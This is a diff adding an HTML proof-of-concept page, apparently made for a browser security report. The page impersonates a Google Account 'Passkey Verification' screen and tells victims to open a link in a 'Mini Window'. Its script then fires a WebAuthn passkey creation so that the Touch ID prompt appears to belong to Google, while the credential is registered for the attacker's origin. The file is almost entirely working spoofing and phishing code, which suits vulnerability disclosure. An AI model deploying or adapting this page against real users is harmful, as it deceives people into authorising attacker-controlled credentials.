@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Google Account - Passkey Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f8f9fa;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            max-width: 460px;
+            text-align: center;
+        }
+        .logo { width: 90px; margin-bottom: 18px; }
+        h2 { color: #202124; font-weight: 400; font-size: 22px; margin-bottom: 8px; }
+        p { color: #5f6368; line-height: 1.6; font-size: 14px; margin-bottom: 25px; }
+        .btn {
+            background: #1a73e8; color: white;
+            padding: 10px 24px; border-radius: 4px;
+            text-decoration: none; display: inline-block;
+            font-weight: 500; cursor: context-menu; border: none; font-size: 14px;
+        }
+        #log {
+            margin-top: 20px; padding: 15px; border-radius: 8px;
+            display: none; text-align: left; font-size: 13px;
+        }
+        .success { background: #fce4ec; border: 1px solid #e53935; color: #b71c1c; }
+        .fail { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <h2>Passkey Verification Required</h2>
+    <p>
+        Your Google account requires Passkey re-verification for enhanced security. 
+        Right-click the button below and select <b>"Open in Mini Window"</b>, 
+        then authenticate with Touch ID when prompted.
+    </p>
+    <a id="trigger" class="btn" href="https://myaccount.google.com">
+        Begin Passkey Verification
+    </a>
+    <div id="log"></div>
+</div>
+
+<script>
+    const trigger = document.getElementById('trigger');
+    const log = document.getElementById('log');
+
+    trigger.addEventListener('contextmenu', () => {
+        console.log("[PoC] Right-click detected. Waiting for Mini Window...");
+
+        setTimeout(async () => {
+            console.log("[PoC] Triggering WebAuthn Passkey creation...");
+
+            try {
+                // WebAuthn Passkey creation request
+                // This triggers the macOS Touch ID / Passkey system dialog
+                // The dialog appears ON TOP of everything, including Mini Window
+                const credential = await navigator.credentials.create({
+                    publicKey: {
+                        challenge: crypto.getRandomValues(new Uint8Array(32)),
+                        rp: {
+                            name: "Security Verification",
+                            id: location.hostname
+                        },
+                        user: {
+                            id: crypto.getRandomValues(new Uint8Array(16)),
+                            name: "user@gmail.com",
+                            displayName: "Google User"
+                        },
+                        pubKeyCredParams: [
+                            { type: "public-key", alg: -7 },   // ES256
+                            { type: "public-key", alg: -257 }  // RS256
+                        ],
+                        authenticatorSelection: {
+                            authenticatorAttachment: "platform",  // Force Touch ID (not USB key)
+                            userVerification: "required"
+                        },
+                        timeout: 60000
+                    }
+                });
+
+                // If user authenticates with Touch ID
+                log.style.display = 'block';
+                log.className = 'success';
+                log.innerHTML = `
+                    <b>🚨 PASSKEY CREATED — TOUCH ID SPOOFED</b><br><br>
+                    <b>Credential ID:</b> <code>${btoa(String.fromCharCode(...new Uint8Array(credential.rawId)))}</code><br><br>
+                    <b>Attack chain:</b><br>
+                    • Mini Window displayed <code>myaccount.google.com</code> (trusted context)<br>
+                    • <code>navigator.credentials.create()</code> triggered macOS Touch ID prompt<br>
+                    • Touch ID dialog appeared ON TOP of Mini Window<br>
+                    • User associated Touch ID request with Google account<br>
+                    • Passkey credential created for <b>attacker's origin</b> — not Google<br><br>
+                    <b>Impact:</b> Attacker now has a registered Passkey on the victim's device. 
+                    This could be used for persistent phishing or to confuse the victim's credential manager.
+                `;
+
+            } catch (err) {
+                log.style.display = 'block';
+                log.className = 'fail';
+                log.innerHTML = `<b>Failed:</b> ${err.message}`;
+                console.log("[PoC] WebAuthn failed:", err.message);
+            }
+
+        }, 3500);
+    });
+</script>
+
+</body>
+</html>
